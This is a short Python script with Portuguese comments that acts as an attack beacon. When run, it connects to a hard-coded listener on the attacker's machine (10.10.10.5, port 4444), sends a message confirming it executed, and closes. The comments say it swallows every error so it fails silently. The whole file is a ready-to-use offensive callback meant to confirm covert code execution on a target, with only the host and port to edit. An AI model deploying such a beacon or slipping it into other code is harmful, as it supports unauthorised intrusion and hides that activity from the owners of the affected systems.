import socket

# --- DADOS A SEREM ALTERADOS ---
# IP da sua máquina de ataque (o listener)
HOST = '10.10.10.5' 
# Porta que seu listener está escutando
PORT = 4444

# Cria o objeto de socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Tenta conectar e enviar um sinal. Se falhar, não faz nada (falha silenciosa).
try:
    # 1. Conecta ao listener na máquina do atacante
    s.connect((HOST, PORT))
    
    # 2. Envia uma mensagem simples (em bytes) para confirmar a execução
    s.send(b'Beacon recebido com sucesso!')
    
    # 3. Fecha a conexão imediatamente
    s.close()
except:
    # Se qualquer erro ocorrer (ex: o listener não está ativo, a rede bloqueia),
    # o programa simplesmente termina sem exibir nenhuma mensagem de erro.
    pass